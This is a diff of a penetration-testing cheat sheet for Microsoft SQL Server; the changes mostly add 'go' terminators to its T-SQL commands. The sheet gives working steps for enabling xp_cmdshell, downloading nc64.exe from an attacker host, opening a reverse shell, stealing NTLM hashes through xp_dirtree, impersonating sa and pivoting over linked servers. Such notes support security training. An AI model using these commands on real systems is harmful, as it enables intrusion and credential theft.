@@ -11,6 +11,8 @@ tags:
 
 # 1433 msSQL
 
+[See msSQL](mssql.md).
+
 ## Enumeration
 
 Basic enumeration:
@@ -68,26 +70,33 @@ python3 mssqlclient.py Administrator@$ip -windows-auth
 select @@version;
 
 # Get usernames
-select user_name();
+select user_name()
+go
 
 # Get databases
-SELECT name FROM master.dbo.sysdatabases;
+SELECT name FROM master.dbo.sysdatabases
+go
 
 # Get current database
-SELECT DB_NAME();
+SELECT DB_NAME()
+go
 
 # Get a list of users in the domain
 SELECT name FROM master..syslogins
+go
 
 # Get a list of users that are sysadmins
- SELECT name FROM master..syslogins WHERE sysadmin = 1;
+SELECT name FROM master..syslogins WHERE sysadmin = 1
+go
 
 # And to make sure: 
-SELECT is_srvrolemember(‘sysadmin’); 
+SELECT is_srvrolemember(‘sysadmin’)
+go
 # If your user is admin, it will return 1.
 
 # Read Local Files in MSSQL
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+go
 ```
 
 ## Attacks
@@ -101,16 +110,20 @@ Because malicious users sometimes attempt to elevate their privileges by using x
 
 ```msSQL
 # To allow advanced options to be changed.   
-EXECUTE sp_configure 'show advanced options', 1;  
+EXECUTE sp_configure 'show advanced options', 1
+go
   
 # To update the currently configured value for advanced options.  
-RECONFIGURE;  
+RECONFIGURE
+go
 
 # To enable the feature.  
-EXECUTE sp_configure 'xp_cmdshell', 1;  
-  
+EXECUTE sp_configure 'xp_cmdshell', 1
+go
+
 # To update the currently configured value for this feature.  
-RECONFIGURE;  
+RECONFIGURE
+go
 ```
 
 >Note:  The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
@@ -119,13 +132,16 @@ Now we can use the msSQL terminal to execute commands:
 
 ```msSQL
 # This will return the .exe files existing in the current directory
-EXEC xp_cmdshell 'dir *.exe';
+EXEC xp_cmdshell 'dir *.exe'
+go
 
 # To print a file
 EXECUTE xp_cmdshell 'type c:\Users\sql_svc\Desktop\user.txt
+go
 
 # With this (and a "python3 -m http.server 80" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe";
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
+go
 
 # We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a "nc -lnvp 443". When launching the reverse shell, we'll get a powershell terminal in this tab by running:
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443";
@@ -146,10 +162,10 @@ When we use one of these stored procedures and point it to our SMB server, the d
 
 ```cmd-session
 # For XP_DIRTREE Hash Stealing
-EXEC master..xp_dirtree '\\$ip\share\'
+EXEC master..xp_dirtree '\\$KaliIP\share\'
 
 # For XP_SUBDIRS Hash Stealing
-EXEC master..xp_subdirs '\\$ip\share\
+EXEC master..xp_subdirs '\\$KaliIP\share\
 
 
 ```
@@ -176,11 +192,17 @@ Impersonating sysadmin
 
 ```cmd-session
 # Identify Users that We Can Impersonate
-SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+SELECT distinct b.name 
+FROM sys.server_permissions a 
+INNER JOIN sys.server_principals b 
+ON a.grantor_principal_id = b.principal_id 
+WHERE a.permission_name = 'IMPERSONATE'
+go
 
 # Verify if our current user has the sysadmin role:
-SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
 #  value 0 indicates no sysadmin role, value 1 is sysadmin role
 
 ```
@@ -188,10 +210,11 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 Impersonating sa user
 
 ```cmd-session
-USE master;
-EXECUTE AS LOGIN = 'sa';
-SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');
+USE master
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
 ```
 
 > It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.
@@ -199,7 +222,8 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 To revert the operation and return to our previous user
 
 ```cmd-session
-REVERT;
+REVERT
+go
 ```
 
 
@@ -211,7 +235,8 @@ If we manage to gain access to a SQL Server with a linked server configured, we 
 
 ```
 # Identify linked Servers in MSSQL
-SELECT srvname, isremote FROM sysservers;
+SELECT srvname, isremote FROM sysservers
+go
 ```
 
 ```cmd-session
@@ -227,7 +252,9 @@ DESKTOP-MFERMN4\SQLEXPRESS          1
 
 ```cmd-session
 #  Identify the user used for the connection and its privileges:
-EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+go 
+
 # The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
 ```
 
